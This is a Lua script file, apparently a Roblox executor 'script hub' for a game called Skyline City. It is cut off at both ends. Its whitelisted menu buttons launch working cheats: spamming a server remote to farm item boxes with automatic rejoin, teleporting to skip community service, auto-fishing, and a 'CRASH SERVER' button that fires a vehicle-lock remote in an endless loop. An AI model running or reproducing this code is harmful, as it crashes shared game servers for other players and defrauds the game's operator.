        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY AUTO FARM (WHITELISTED)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local RS = game:GetService("ReplicatedStorage")

local WHITELIST = {
    "cheskamaganda17",
    "Username2",
    "Username3",
}

local isWhitelisted = false
for _, name in ipairs(WHITELIST) do
    if string.lower(name) == string.lower(LocalPlayer.Name) then
        isWhitelisted = true
        break
    end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyFarmGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 120)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -60)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(210, 210, 210)
UIStroke.Thickness = 1
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

local StartBtn = Instance.new("TextButton")
StartBtn.Size = UDim2.new(0, 180, 0, 36)
StartBtn.Position = UDim2.new(0.5, -90, 0, 52)
StartBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StartBtn.Text = isWhitelisted and "START FARM" or "NOT WHITELISTED"
StartBtn.TextColor3 = isWhitelisted and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(0, 0, 0)
StartBtn.TextSize = 15
StartBtn.Font = Enum.Font.RobotoMono
StartBtn.BorderSizePixel = 0
StartBtn.Active = isWhitelisted
StartBtn.ZIndex = 2
StartBtn.Parent = MainFrame

local StartBtnCorner = Instance.new("UICorner")
StartBtnCorner.CornerRadius = UDim.new(0, 6)
StartBtnCorner.Parent = StartBtn

local StartBtnStroke = Instance.new("UIStroke")
StartBtnStroke.Color = isWhitelisted and Color3.fromRGB(20, 20, 20) or Color3.fromRGB(200, 200, 200)
StartBtnStroke.Thickness = 0
StartBtnStroke.Parent = StartBtn

if not isWhitelisted then
    local LockOverlay = Instance.new("Frame")
    LockOverlay.Size = UDim2.new(1, 0, 1, 0)
    LockOverlay.Position = UDim2.new(0, 0, 0, 0)
    LockOverlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    LockOverlay.BackgroundTransparency = 0.5
    LockOverlay.BorderSizePixel = 0
    LockOverlay.ZIndex = 10
    LockOverlay.Parent = MainFrame

    local LockOverlayCorner = Instance.new("UICorner")
    LockOverlayCorner.CornerRadius = UDim.new(0, 8)
    LockOverlayCorner.Parent = LockOverlay

    local LockLabel = Instance.new("TextLabel")
    LockLabel.Size = UDim2.new(1, 0, 0, 20)
    LockLabel.Position = UDim2.new(0, 0, 0.5, 20)
    LockLabel.BackgroundTransparency = 1
    LockLabel.Text = "@" .. LocalPlayer.Name .. " @ x01337 "
    LockLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    LockLabel.TextSize = 10
    LockLabel.Font = Enum.Font.RobotoMono
    LockLabel.TextXAlignment = Enum.TextXAlignment.Center
    LockLabel.ZIndex = 11
    LockLabel.Parent = MainFrame
end

StartBtn.MouseButton1Click:Connect(function()
    if not isWhitelisted then return end

    StartBtn.Text = "STARTING..."

    local MAX = 12
    local DELAY = 0.001
    local REJOIN_DELAY = 3

    local function saveAndRejoin()
        task.wait(REJOIN_DELAY)
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end

    local function runScript()
        local remote = RS:WaitForChild("GiveAyuda", 9e9)
        local args = { [1] = "Skyline Box" }
        for i = 1, MAX do
            remote:FireServer(unpack(args))
            task.wait(DELAY)
        end
        saveAndRejoin()
    end

    if queue_on_teleport then
        queue_on_teleport([[
            local TeleportService = game:GetService("TeleportService")
            local Players = game:GetService("Players")
            local RS = game:GetService("ReplicatedStorage")
            local MAX = 12
            local DELAY = 0.001
            local REJOIN_DELAY = 3
            local function saveAndRejoin()
                task.wait(REJOIN_DELAY)
                TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
            end
            local function runScript()
                local remote = RS:WaitForChild("GiveAyuda", 9e9)
                local args = { [1] = "Skyline Box" }
                for i = 1, MAX do
                    remote:FireServer(unpack(args))
                    task.wait(DELAY)
                end
                saveAndRejoin()
            end
            if not game:IsLoaded() then game.Loaded:Wait() end
            task.wait(2)
            runScript()
        ]])
    end

    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(2)
    runScript()
end)

local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY BYPASS COMMUNITY SERVICE (WHITELISTED)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")

-- // WHITELIST
local WHITELIST = {
    "nodylaws", -- palitan ng tunay na username
    "GBG_SEN",
    "username3",
}

local isWhitelisted = false
for _, name in ipairs(WHITELIST) do
    if name:lower() == LocalPlayer.Name:lower() then
        isWhitelisted = true
        break
    end
end

local targets = {
    workspace.CommunityServiceArea.CleanFolder:GetChildren()[9],
    workspace.CommunityServiceArea.CleanFolder:GetChildren()[14],
    workspace.CommunityServiceArea.CleanFolder:GetChildren()[12],
    workspace.CommunityServiceArea.CleanFolder.Clean,
    workspace.CommunityServiceArea.CleanFolder:GetChildren()[10],
    workspace.CommunityServiceArea.CleanFolder:GetChildren()[6],
    workspace.CommunityServiceArea.CleanFolder:GetChildren()[3],
}

local BUTTONS = {
    {name = "200 COMMUNITY SERVICE", duration = math.huge},
    {name = "500 COMMUNITY SERVICE", duration = math.huge},
    {name = "700 COMMUNITY SERVICE", duration = math.huge},
    {name = "900 COMMUNITY SERVICE", duration = math.huge},
    {name = "1000 COMMUNITY SERVICE", duration = math.huge},
}

local states = {}
local threads = {}
local currentIndex = {}

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 260, 0, 60 + #BUTTONS * 44)
MainFrame.Position = UDim2.new(0.5, -130, 0.5, -(60 + #BUTTONS * 44) / 2)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local Shadow = Instance.new("Frame")
Shadow.Size = UDim2.new(1, 8, 1, 8)
Shadow.Position = UDim2.new(0, -4, 0, 4)
Shadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shadow.BackgroundTransparency = 0.75
Shadow.BorderSizePixel = 0
Shadow.ZIndex = MainFrame.ZIndex - 1
Shadow.Parent = MainFrame

local ShadowCorner = Instance.new("UICorner")
ShadowCorner.CornerRadius = UDim.new(0, 10)
ShadowCorner.Parent = Shadow

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 36)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, -10, 1, 0)
TitleLabel.Position = UDim2.new(0, 5, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 24, 0, 24)
CloseButton.Position = UDim2.new(1, -30, 0.5, -12)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Text = "x"
CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseButton.TextSize = 11
CloseButton.Font = Enum.Font.RobotoMono
CloseButton.BorderSizePixel = 0
CloseButton.ZIndex = 4
CloseButton.Parent = TitleBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 4)
CloseCorner.Parent = CloseButton

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- // Whitelist status label sa ilalim ng title
local WhitelistLabel = Instance.new("TextLabel")
WhitelistLabel.Size = UDim2.new(1, -20, 0, 14)
WhitelistLabel.Position = UDim2.new(0, 10, 0, 38)
WhitelistLabel.BackgroundTransparency = 1
WhitelistLabel.TextSize = 9
WhitelistLabel.Font = Enum.Font.RobotoMono
WhitelistLabel.TextXAlignment = Enum.TextXAlignment.Center
WhitelistLabel.ZIndex = 3
WhitelistLabel.Parent = MainFrame

if isWhitelisted then
    WhitelistLabel.Text = "whitelisted: " .. LocalPlayer.Name
    WhitelistLabel.TextColor3 = Color3.fromRGB(0, 150, 0)
else
    WhitelistLabel.Text = "🔒 Not Whitelisted: " .. LocalPlayer.Name
    WhitelistLabel.TextColor3 = Color3.fromRGB(200, 0, 0)
end

local function runScript(duration, toggleBtn, name)
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local startTime = os.clock()
    currentIndex[name] = currentIndex[name] or 1

    threads[name] = task.spawn(function()
        while states[name] and (os.clock() - startTime) < duration do
            local target = targets[currentIndex[name]]
            if target then
                pcall(function()
                    hrp.CFrame = target.CFrame + Vector3.new(0, 5, 0)
                end)

                task.wait(0.001)

                local prompt = target:FindFirstChild("ProximityPrompt") or
                               (target.Name == "Clean" and workspace.CommunityServiceArea.CleanFolder.Clean:FindFirstChild("ProximityPrompt"))

                if prompt then
                    pcall(function()
                        prompt.HoldDuration = 0
                        prompt.RequiresLineOfSight = false
                        prompt.MaxActivationDistance = 9999
                    end)

                    for _ = 1, 18 do
                        pcall(function()
                            fireproximityprompt(prompt)
                        end)
                        task.wait(0.001)
                    end
                end
            end

            currentIndex[name] = currentIndex[name] % #targets + 1
        end

        states[name] = false
        toggleBtn.Text = "OFF"
        toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    end)
end

for i, btn in ipairs(BUTTONS) do
    states[btn.name] = false
    currentIndex[btn.name] = 1

    local yPos = 56 + (i - 1) * 44
    local RowFrame = Instance.new("Frame")
    RowFrame.Size = UDim2.new(1, -20, 0, 34)
    RowFrame.Position = UDim2.new(0, 10, 0, yPos)
    RowFrame.BackgroundColor3 = i % 2 == 0 and Color3.fromRGB(245, 245, 245) or Color3.fromRGB(255, 255, 255)
    RowFrame.BorderSizePixel = 0
    RowFrame.ZIndex = 2
    RowFrame.Parent = MainFrame

    local RowCorner = Instance.new("UICorner")
    RowCorner.CornerRadius = UDim.new(0, 6)
    RowCorner.Parent = RowFrame

    local NameLabel = Instance.new("TextLabel")
    NameLabel.Size = UDim2.new(0.55, 0, 1, 0)
    NameLabel.Position = UDim2.new(0, 10, 0, 0)
    NameLabel.BackgroundTransparency = 1
    NameLabel.Text = btn.name
    NameLabel.TextColor3 = isWhitelisted and Color3.fromRGB(20, 20, 20) or Color3.fromRGB(180, 180, 180)
    NameLabel.TextSize = 11
    NameLabel.Font = Enum.Font.RobotoMono
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
    NameLabel.ZIndex = 3
    NameLabel.Parent = RowFrame

    local ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Size = UDim2.new(0, 70, 0, 24)
    ToggleBtn.Position = UDim2.new(1, -80, 0.5, -12)
    ToggleBtn.BorderSizePixel = 0
    ToggleBtn.ZIndex = 3
    ToggleBtn.Font = Enum.Font.RobotoMono
    ToggleBtn.TextSize = 11
    ToggleBtn.Parent = RowFrame

    -- // Button appearance per whitelist
    if isWhitelisted then
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ToggleBtn.Text = "OFF"
        ToggleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    else
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
        ToggleBtn.Text = "🔒"
        ToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
    end

    local ToggleCorner = Instance.new("UICorner")
    ToggleCorner.CornerRadius = UDim.new(0, 5)
    ToggleCorner.Parent = ToggleBtn

    local capturedBtn = btn
    local capturedToggle = ToggleBtn

    ToggleBtn.MouseButton1Click:Connect(function()
        -- // Block kung hindi whitelisted
        if not isWhitelisted then return end

        states[capturedBtn.name] = not states[capturedBtn.name]

        if states[capturedBtn.name] then
            capturedToggle.Text = "ON"
            capturedToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            runScript(capturedBtn.duration, capturedToggle, capturedBtn.name)
        else
            if threads[capturedBtn.name] then
                task.cancel(threads[capturedBtn.name])
                threads[capturedBtn.name] = nil
            end
            capturedToggle.Text = "OFF"
            capturedToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)
end

-- // Drag logic
local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY CRASH SERVER (WHITELISTED)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")

local WHITELIST = {
    "cheskamaganda17",
    "Username2",
    "Username3",
}

local isWhitelisted = false
for _, name in ipairs(WHITELIST) do
    if string.lower(name) == string.lower(LocalPlayer.Name) then
        isWhitelisted = true
        break
    end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyCrashGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 120)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -60)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(210, 210, 210)
UIStroke.Thickness = 1
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

local CrashBtn = Instance.new("TextButton")
CrashBtn.Size = UDim2.new(0, 180, 0, 36)
CrashBtn.Position = UDim2.new(0.5, -90, 0, 52)
CrashBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CrashBtn.Text = isWhitelisted and "CRASH" or "NOT WHITELISTED"
CrashBtn.TextColor3 = isWhitelisted and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(0, 0, 0)
CrashBtn.TextSize = 20
CrashBtn.Font = Enum.Font.RobotoMono
CrashBtn.BorderSizePixel = 0
CrashBtn.Active = isWhitelisted
CrashBtn.ZIndex = 2
CrashBtn.Parent = MainFrame

local CrashBtnCorner = Instance.new("UICorner")
CrashBtnCorner.CornerRadius = UDim.new(0, 6)
CrashBtnCorner.Parent = CrashBtn

local CrashBtnStroke = Instance.new("UIStroke")
CrashBtnStroke.Color = isWhitelisted and Color3.fromRGB(20, 20, 20) or Color3.fromRGB(200, 200, 200)
CrashBtnStroke.Thickness = 0
CrashBtnStroke.Parent = CrashBtn

CrashBtn.MouseButton1Click:Connect(function()
    if not isWhitelisted then return end
    CrashBtn.Text = "CRASHING..."
    task.spawn(function()
        local remote = RS
            :WaitForChild("VehicleDealerSystem", 9e9)
            :WaitForChild("Spawner", 9e9)
            :WaitForChild("Events", 9e9)
            :WaitForChild("VehicleLockEvent", 9e9)
        local args = { [1] = false }
        while true do
            remote:FireServer(unpack(args))
            task.wait(0.001)
        end
    end)
end)

if not isWhitelisted then
    local LockOverlay = Instance.new("Frame")
    LockOverlay.Size = UDim2.new(1, 0, 1, 0)
    LockOverlay.Position = UDim2.new(0, 0, 0, 0)
    LockOverlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    LockOverlay.BackgroundTransparency = 0.5
    LockOverlay.BorderSizePixel = 0
    LockOverlay.ZIndex = 10
    LockOverlay.Parent = MainFrame

    local LockOverlayCorner = Instance.new("UICorner")
    LockOverlayCorner.CornerRadius = UDim.new(0, 8)
    LockOverlayCorner.Parent = LockOverlay

    local LockLabel = Instance.new("TextLabel")
    LockLabel.Size = UDim2.new(1, 0, 0, 20)
    LockLabel.Position = UDim2.new(0, 0, 0.5, 10)
    LockLabel.BackgroundTransparency = 1
    LockLabel.Text = "@" .. LocalPlayer.Name .. " @ x01337"
    LockLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    LockLabel.TextSize = 10
    LockLabel.Font = Enum.Font.RobotoMono
    LockLabel.TextXAlignment = Enum.TextXAlignment.Center
    LockLabel.ZIndex = 11
    LockLabel.Parent = MainFrame
end

local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY AUTO FISH FARM (MONSY)", function()
	local player = game:GetService("Players").LocalPlayer

local function teleport()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp  = char:WaitForChild("HumanoidRootPart")
    hrp.CFrame = CFrame.new(1389.9095458984375, -19.000171661376953, 2910.85791015625)
end

teleport()

-- ╔══════════════════════════════════╗
-- ║     // @ Monsy West              ║
-- ║     Skyline City  |              ║
-- ╚══════════════════════════════════╝

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService  = game:GetService("UserInputService")
local VIM               = game:GetService("VirtualInputManager")

local player    = Players.LocalPlayer
local Remotes   = ReplicatedStorage:WaitForChild("Remotes",    9e9)
local SkylineRP = ReplicatedStorage:WaitForChild("SkylineRP",  9e9)

local CastEvent = Remotes:WaitForChild("CastEvent",              9e9)
local MiniGame  = Remotes:WaitForChild("MiniGame",               9e9)
local ShopEvent = SkylineRP:WaitForChild("LoadingScreenEvent",   9e9)

-- ─── Constants ────────────────────────────────────────────
local ROD_NAME   = "Normal Rod"
local ROD_PRICE  = 50
local ROD_SELLER = "devxzy01"

-- ─── State ────────────────────────────────────────────────
local autoFishing = false
local catching    = false
local rebuying    = false
local catchCount  = 0

-- ─── Press F ──────────────────────────────────────────────
local function pressF()
    VIM:SendKeyEvent(true,  Enum.KeyCode.F, false, game)
    task.wait(0.001)
    VIM:SendKeyEvent(false, Enum.KeyCode.F, false, game)
end

-- ─── Rod Helpers ──────────────────────────────────────────
local function hasRod()
    local char     = player.Character
    local backpack = player:FindFirstChild("Backpack")
    if char     and char:FindFirstChild(ROD_NAME)     then return true end
    if backpack and backpack:FindFirstChild(ROD_NAME) then return true end
    return false
end

local function equipRod()
    local char     = player.Character
    local backpack = player:FindFirstChild("Backpack")
    if not char then return false end
    if char:FindFirstChild(ROD_NAME) then return true end
    local rod = backpack and backpack:FindFirstChild(ROD_NAME)
    if rod then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum:EquipTool(rod)
            task.wait(0.6)
            return true
        end
    end
    return false
end

local function buyRod()
    ShopEvent:FireServer(ROD_NAME, ROD_PRICE, ROD_SELLER)
    local backpack = player:WaitForChild("Backpack")
    for _ = 1, 30 do
        if backpack:FindFirstChild(ROD_NAME) then return true end
        task.wait(0.2)
    end
    return false
end

local function ensureRod()
    if not hasRod() then
        local bought = buyRod()
        if not bought then return false end
    end
    return equipRod()
end

-- ─── Cast (once) ──────────────────────────────────────────
local function doCast()
    local dist = math.random(45, 75) + math.random()
    CastEvent:FireServer(true)
    task.wait(0.5)
    CastEvent:FireServer(false, dist)
end

-- ─── GUI ──────────────────────────────────────────────────
local function corner(p, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 8)
    c.Parent = p
end

local old = player.PlayerGui:FindFirstChild("FishFarmGUI")
if old then old:Destroy() end

local sg = Instance.new("ScreenGui")
sg.Name           = "FishFarmGUI"
sg.ResetOnSpawn   = false
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
sg.Parent         = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size             = UDim2.new(0, 240, 0, 215)
frame.Position         = UDim2.new(0.5, -120, 0.08, 0)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderSizePixel  = 0
frame.Parent           = sg
corner(frame, 10)

local stroke = Instance.new("UIStroke")
stroke.Color     = Color3.fromRGB(200, 200, 200)
stroke.Thickness = 1.5
stroke.Parent    = frame

-- Title bar
local titleBar = Instance.new("Frame")
titleBar.Size             = UDim2.new(1, 0, 0, 38)
titleBar.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
titleBar.BorderSizePixel  = 0
titleBar.Parent           = frame
corner(titleBar, 10)

local tbFix = Instance.new("Frame")
tbFix.Size             = UDim2.new(1, 0, 0.5, 0)
tbFix.Position         = UDim2.new(0, 0, 0.5, 0)
tbFix.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
tbFix.BorderSizePixel  = 0
tbFix.Parent           = titleBar

-- CENTERED title
local titleTxt = Instance.new("TextLabel")
titleTxt.Size               = UDim2.new(1, 0, 1, 0)
titleTxt.Position           = UDim2.new(0, 0, 0, 0)
titleTxt.BackgroundTransparency = 1
titleTxt.Text               = "// @ Monsy"
titleTxt.TextSize           = 17
titleTxt.Font               = Enum.Font.RobotoMono
titleTxt.TextColor3         = Color3.fromRGB(0, 0, 0)
titleTxt.TextXAlignment     = Enum.TextXAlignment.Center
titleTxt.TextYAlignment     = Enum.TextYAlignment.Center
titleTxt.Parent             = titleBar

local div = Instance.new("Frame")
div.Size             = UDim2.new(1, -20, 0, 1)
div.Position         = UDim2.new(0, 10, 0, 43)
div.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
div.BorderSizePixel  = 0
div.Parent           = frame

local BLACK = Color3.fromRGB(0, 0, 0)
local GREY  = Color3.fromRGB(80, 80, 80)
local WHITE = Color3.fromRGB(255, 255, 255)

local statusLabel = Instance.new("TextLabel")
statusLabel.Size               = UDim2.new(1, -20, 0, 22)
statusLabel.Position           = UDim2.new(0, 14, 0, 52)
statusLabel.BackgroundTransparency = 1
statusLabel.Text               = "Status: Idle"
statusLabel.TextSize           = 12
statusLabel.Font               = Enum.Font.RobotoMono
statusLabel.TextColor3         = BLACK
statusLabel.TextXAlignment     = Enum.TextXAlignment.Left
statusLabel.Parent             = frame

local phaseLabel = Instance.new("TextLabel")
phaseLabel.Size               = UDim2.new(1, -20, 0, 22)
phaseLabel.Position           = UDim2.new(0, 14, 0, 76)
phaseLabel.BackgroundTransparency = 1
phaseLabel.Text               = ""
phaseLabel.TextSize           = 11
phaseLabel.Font               = Enum.Font.RobotoMono
phaseLabel.TextColor3         = GREY
phaseLabel.TextXAlignment     = Enum.TextXAlignment.Left
phaseLabel.Parent             = frame

local rodLabel = Instance.new("TextLabel")
rodLabel.Size               = UDim2.new(1, -20, 0, 22)
rodLabel.Position           = UDim2.new(0, 14, 0, 100)
rodLabel.BackgroundTransparency = 1
rodLabel.Text               = "Rod: --"
rodLabel.TextSize           = 11
rodLabel.Font               = Enum.Font.RobotoMono
rodLabel.TextColor3         = GREY
